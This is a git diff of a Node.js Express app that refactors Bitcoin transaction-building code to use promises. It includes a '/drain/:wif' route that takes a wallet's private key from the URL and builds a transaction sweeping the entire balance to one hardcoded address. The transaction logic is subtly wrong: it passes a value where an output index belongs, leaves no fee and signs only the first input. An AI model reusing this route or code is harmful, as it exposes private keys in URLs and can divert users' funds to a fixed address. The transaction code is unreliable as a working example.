@@ -81,31 +81,29 @@ app.get('/:amount',
 
 function getTransactions(address) {
 	const client = require('json-client')('https://blockchain.info/');
-	const addressInfo = client('get', 'address/' + address + '?format=json');
-
-	const transactions = addressInfo.txs;
-
-	return transactions;
+	return client('get', 'address/' + address + '?format=json')
+		.then(function (v) { return v.txs; });
 }
 
 function buildTransaction(from_keypair, to_address) {
 	const transactionBuilder = new bitcoin.TransactionBuilder();
-	const trs = getTransactions(from_keypair.getAddress());
-	var tot = 0;
+	const trs = getTransactions(from_keypair.getAddress()).then(function (trs) {
+		var tot = 0;
 
-	for (var i = 0; i < trs.length; i++) {
-		const val = trs[i].out
-					.map(function (a) { return a.value; })
-					.reduce(function (last, cur) { return last + cur; });
-		tot += val;
+		for (var i = 0; i < trs.length; i++) {
+			const val = trs[i].out
+						.map(function (a) { return a.value; })
+						.reduce(function (last, cur) { return last + cur; });
+			tot += val;
 
-		transactionBuilder.addInput(trs[i].hash, val);
-	}
+			transactionBuilder.addInput(trs[i].hash, val);
+		}
 
-	transactionBuilder.addOutput(to_address, tot);
-	transactionBuilder.sign(0, from_keypair);
+		transactionBuilder.addOutput(to_address, tot);
+		transactionBuilder.sign(0, from_keypair);
 
-	return transactionBuilder.build().toHex();
+		return transactionBuilder.build().toHex();
+	});
 }
 
 app.get('/filled/:to/:amount',
@@ -126,15 +124,12 @@ app.get('/filled/:to/:amount',
 app.get('/drain/:wif',
 	function (req, res) {
 		const wallet = bitcoin.ECPair.fromWIF(req.params.wif);
-		try {
 		buildTransaction(
 			wallet,
 			'17FoAFb3vVh4XnGxXcJVrFU9KYXEHDUE2b'
-		);
-		} catch (e) {
+		).then(function (v) { res.status(200).end(); }, function (e) {
 			return res.status(500).json(e);
-		}
-		res.status(200).end();
+		});
 	}
 );
 
